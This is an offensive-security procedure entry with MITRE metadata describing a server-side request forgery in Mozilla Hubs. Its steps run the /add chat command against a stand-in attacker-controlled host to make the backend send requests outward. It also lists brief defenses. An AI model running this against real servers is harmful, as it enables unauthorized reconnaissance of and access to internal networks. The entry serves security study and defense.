---
id: proc-mozilla-hubs-ssrf-001
tags:
  - ssrf
  - url-forgery
  - backend-pingback
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/hubs-add-custom-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:30:46.923Z'
skill_level: advanced
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Trigger-SSRF-with-Custom-URLs

## Summary

This procedure leverages the /add command in Mozilla Hubs to supply custom URLs, inducing the backend to send unvalidated pingbacks, potentially enabling server-side request forgery to internal or external resources.

## Description

The Hubs server processes /add URLs by fetching or pinging them without validation, leading to SSRF. Observed multiple requests to attacker-controlled servers when using custom URLs. This targets backend WebSocket handlers and could allow access to internal services if the instance is misconfigured. Further exploitation involves crafting URLs for intranet targets.

## Requirements

1. Control over a server to log incoming requests
2. Access to Hubs room chat
3. Knowledge of target internal network (for advanced SSRF)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist URLs in /add processing
- Block outbound requests to non-public domains from backend
- Log all backend fetches and alert on suspicious patterns

## Objectives

1. Induce unauthorized server requests
2. Perform reconnaissance via pingbacks
3. Chain with internal access if possible

## Instructions

### Step 1: Prepare Attacker Server

**Context**: Set up endpoint to capture requests.

No command; host a simple HTTP server (e.g., using Python: python -m http.server) on attacker-controlled domain.

> Server ready to log incoming pingbacks.

### Step 2: Trigger with Custom URL

**Context**: Use /add to force backend interaction.

**Command** ([[commands/hubs-add-custom-url]]):
```bash
/add --no-menu http://attacker-controlled-server.com/ping
```

> Hubs backend sends multiple GET requests to the URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Steal Application Access Token]]

### Sub-Techniques


## Commands Used

- [[commands/hubs-add-custom-url]]

## Tools Used


## Tags

- [[ssrf]]
- [[url-forgery]]
- [[backend-pingback]]
